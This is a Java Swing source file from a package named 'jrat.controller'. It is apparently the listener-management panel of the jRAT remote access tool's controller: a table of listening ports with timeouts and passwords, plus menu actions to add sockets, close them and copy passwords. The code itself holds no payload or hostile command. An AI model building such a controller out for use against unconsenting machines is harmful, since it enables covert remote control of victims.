package jrat.controller.ui.panels;

import jrat.api.Resources;
import jrat.controller.ErrorDialog;
import jrat.controller.net.PortListener;
import jrat.controller.ui.DefaultJTable;
import jrat.controller.ui.components.TableModel;
import jrat.controller.ui.frames.FrameAddSocket;
import jrat.controller.ui.renderers.table.SocketsTableRenderer;

import javax.swing.*;
import javax.swing.GroupLayout.Alignment;
import java.awt.*;
import java.awt.datatransfer.StringSelection;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;

@SuppressWarnings("serial")
public class PanelMainSockets extends JPanel {

	private JTable table;
	private TableModel model;
	public static PanelMainSockets instance;

	public TableModel getModel() {
		return model;
	}

	public PanelMainSockets() {
		instance = this;
		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 450, Short.MAX_VALUE));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 300, Short.MAX_VALUE));

		table = new DefaultJTable();
		table.setDefaultRenderer(Object.class, new SocketsTableRenderer());
		table.setModel(model = new TableModel(new Object[][] {}, new String[] { "Status", "Name", "Port", "Timeout", "Pass" }));
		table.getColumnModel().getColumn(1).setPreferredWidth(211);
		table.getColumnModel().getColumn(2).setPreferredWidth(60);
		table.getColumnModel().getColumn(3).setPreferredWidth(101);
		table.getColumnModel().getColumn(4).setPreferredWidth(110);

		table.getTableHeader().setReorderingAllowed(false);

		JPopupMenu popupMenu = new JPopupMenu();
		addPopup(scrollPane, popupMenu);
		addPopup(table, popupMenu);

		JMenuItem mntmAddSocket = new JMenuItem("Add Socket");
		mntmAddSocket.setIcon(Resources.getIcon("socket-add"));
		mntmAddSocket.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				FrameAddSocket frame = new FrameAddSocket();
				frame.setVisible(true);
			}
		});
		popupMenu.add(mntmAddSocket);

		popupMenu.addSeparator();

		JMenuItem mntmCloseSocket = new JMenuItem("Close Socket");
		mntmCloseSocket.setIcon(Resources.getIcon("socket-remove"));
		mntmCloseSocket.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				try {
					int row = table.getSelectedRow();
					if (row != -1) {
						String name = model.getValueAt(row, 1).toString();
						String port = model.getValueAt(row, 2).toString();
						String timeout = model.getValueAt(row, 3).toString();
						String pass = model.getValueAt(row, 4).toString().split(", ")[0];

						PortListener con = PortListener.getListener(name, Integer.parseInt(port), Integer.parseInt(timeout), pass);
						con.getServer().close();
						PortListener.listeners.remove(con);
						
						model.removeRow(row);
					}
				} catch (Exception ex) {
					ex.printStackTrace();
					ErrorDialog.create(ex);
				}
			}
		});
		popupMenu.add(mntmCloseSocket);

		JMenuItem mntmCloseAllSockets = new JMenuItem("Close all Sockets");
		mntmCloseAllSockets.setIcon(Resources.getIcon("socket-remove"));
		mntmCloseAllSockets.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				while (model.getRowCount() > 0) {
					model.removeRow(0);
				}
				for (int i = 0; i < PortListener.listeners.size(); i++) {
					PortListener con = PortListener.listeners.get(i);
					try {
						con.getServer().close();
					} catch (Exception ex) {
						ex.printStackTrace();
						ErrorDialog.create(ex);
					}
				}
				PortListener.listeners.clear();
			}
		});
		popupMenu.add(mntmCloseAllSockets);

		popupMenu.addSeparator();

		JMenuItem mntmPassword = new JMenuItem("Copy Password");
		popupMenu.add(mntmPassword);
		mntmPassword.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				copy(table.getSelectedRow(), 4);
			}
		});
		mntmPassword.setIcon(Resources.getIcon("clipboard"));

		table.setRowHeight(25);
		scrollPane.setViewportView(table);
		setLayout(groupLayout);

	}

	public void copy(int row, int col) {
		if (row != -1) {
			Toolkit.getDefaultToolkit().getSystemClipboard().setContents(new StringSelection(getModel().getValueAt(row, col).toString()), null);
		}
	}

	private static void addPopup(Component component, final JPopupMenu popup) {
		component.addMouseListener(new MouseAdapter() {
			public void mousePressed(MouseEvent e) {
				if (e.isPopupTrigger()) {
					showMenu(e);
				}
			}

			public void mouseReleased(MouseEvent e) {
				if (e.isPopupTrigger()) {
					showMenu(e);
				}
			}

			private void showMenu(MouseEvent e) {
				popup.show(e.getComponent(), e.getX(), e.getY());
			}
		});
	}
}
